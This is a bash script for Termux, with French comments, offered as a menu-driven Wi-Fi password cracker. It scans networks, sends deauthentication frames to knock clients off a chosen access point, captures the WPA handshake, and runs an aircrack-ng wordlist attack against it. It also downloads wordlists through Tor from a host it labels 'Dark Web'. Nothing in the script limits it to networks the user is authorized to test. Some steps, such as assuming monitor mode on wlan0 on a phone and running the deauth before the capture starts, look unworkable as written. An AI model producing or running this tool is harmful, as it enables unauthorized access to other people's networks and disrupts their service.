#!/data/data/com.termux/files/usr/bin/bash

# Configuration
OUTPUT_DIR="wifi_cracker_output"
WORDLIST_DIR="wordlists"
HANDSHAKE_FILE="handshake.cap"
LOG_FILE="wifi_cracker.log"

# Couleurs
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
NC='\033[0m'

# Journalisation
log() {
    echo -e "$(date '+%Y-%m-%d %H:%M:%S') - $1" >> $OUTPUT_DIR/$LOG_FILE
}

# Vérification des dépendances
check_dependencies() {
    echo -e "${YELLOW}[*] Vérification des dépendances...${NC}"
    if ! pkg list-installed | grep -q 'aircrack-ng'; then
        echo -e "${RED}[!] Installation d'aircrack-ng...${NC}"
        pkg install aircrack-ng -y || { echo -e "${RED}[!] Échec de l'installation d'aircrack-ng.${NC}"; exit 1; }
    fi
    if ! pkg list-installed | grep -q 'tor'; then
        echo -e "${RED}[!] Installation de Tor...${NC}"
        pkg install tor -y || { echo -e "${RED}[!] Échec de l'installation de Tor.${NC}"; exit 1; }
    fi
    if ! pkg list-installed | grep -q 'wget'; then
        echo -e "${RED}[!] Installation de wget...${NC}"
        pkg install wget -y || { echo -e "${RED}[!] Échec de l'installation de wget.${NC}"; exit 1; }
    fi
    echo -e "${GREEN}[+] Toutes les dépendances sont installées.${NC}"
}

# Initialisation de l'environnement
init_env() {
    mkdir -p $OUTPUT_DIR
    mkdir -p $WORDLIST_DIR
    touch $OUTPUT_DIR/$LOG_FILE
    log "Environnement initialisé."
}

# Affichage du menu principal
show_banner() {
    clear
    echo -e "${GREEN}"
    echo "  █▀▀ █░█ █▀▀ █▀▀ ▀█▀ █▀▀ █▀█ █▀▄▀█ █▀▀"
    echo "  █▄▄ █▀█ ██▄ █▄▄ ░█░ ██▄ █▀▄ █░▀░█ ██▄"
    echo -e "${NC}"
}

# Scanner les réseaux Wi-Fi
scan_networks() {
    echo -e "\n${YELLOW}[*] Démarrage du scan Wi-Fi...${NC}"
    termux-wifi-scaninfo > "$OUTPUT_DIR/scan_results.txt"
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}[+] Scan terminé! Résultats:${NC}"
        cat "$OUTPUT_DIR/scan_results.txt"
        log "Scan Wi-Fi terminé avec succès."
    else
        echo -e "${RED}[!] Échec du scan Wi-Fi.${NC}"
        log "Échec du scan Wi-Fi."
    fi
}

# Capturer un handshake
capture_handshake() {
    read -p "BSSID cible: " bssid
    read -p "Canal: " channel
    echo -e "\n${YELLOW}[*] Capture du handshake sur $bssid...${NC}"
    aireplay-ng --deauth 10 -a $bssid wlan0
    airodump-ng -c $channel --bssid $bssid -w $OUTPUT_DIR/$HANDSHAKE_FILE wlan0
    if [ -f "$OUTPUT_DIR/$HANDSHAKE_FILE-01.cap" ]; then
        echo -e "${GREEN}[+] Handshake capturé dans $OUTPUT_DIR/$HANDSHAKE_FILE-01.cap${NC}"
        log "Handshake capturé avec succès pour le BSSID $bssid."
    else
        echo -e "${RED}[!] Échec de la capture du handshake.${NC}"
        log "Échec de la capture du handshake pour le BSSID $bssid."
    fi
}

# Crackeur de mot de passe (Bruteforce)
start_bruteforce() {
    echo -e "\n${YELLOW}[*] Liste des wordlists:${NC}"
    ls $WORDLIST_DIR
    read -p "Nom de la wordlist: " wordlist
    if [ ! -f "$WORDLIST_DIR/$wordlist" ]; then
        echo -e "${RED}[!] Wordlist introuvable.${NC}"
        log "Wordlist $wordlist introuvable."
        return
    fi
    echo -e "${YELLOW}[*] Démarrage du bruteforce...${NC}"
    aircrack-ng -w $WORDLIST_DIR/$wordlist $OUTPUT_DIR/$HANDSHAKE_FILE-01.cap
    log "Bruteforce démarré avec la wordlist $wordlist."
}

# Télécharger des wordlists du Dark Web
download_wordlists() {
    echo -e "\n${YELLOW}[*] Téléchargement depuis le Dark Web...${NC}"
    torify wget -q --show-progress -P $WORDLIST_DIR \
    http://darkzzx4avcsuofgfe5gqsn2dd.cc/db/wordlists/ultimate.txt \
    http://darkzzx4avcsuofgfe5gqsn2dd.cc/db/wordlists/darkweb2023.txt
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}[+] Wordlists téléchargées!${NC}"
        log "Wordlists téléchargées avec succès."
    else
        echo -e "${RED}[!] Échec du téléchargement des wordlists.${NC}"
        log "Échec du téléchargement des wordlists."
    fi
}

# Menu principal
main_menu() {
    while true; do
        echo -e "\n${BLUE}[MENU PRINCIPAL]${NC}"
        echo "1. Scanner les réseaux Wi-Fi"
        echo "2. Capturer un handshake"
        echo "3. Crackeur de mot de passe (Bruteforce)"
        echo "4. Télécharger des wordlists du Dark Web"
        echo "5. Afficher les logs"
        echo "6. Quitter"
        read -p "Choix: " choice

        case $choice in
            1) scan_networks ;;
            2) capture_handshake ;;
            3) start_bruteforce ;;
            4) download_wordlists ;;
            5) cat $OUTPUT_DIR/$LOG_FILE ;;
            6) exit 0 ;;
            *) echo -e "${RED}Option invalide!${NC}" ;;
        esac
    done
}

# Execution
check_dependencies
init_env
show_banner
main_menu
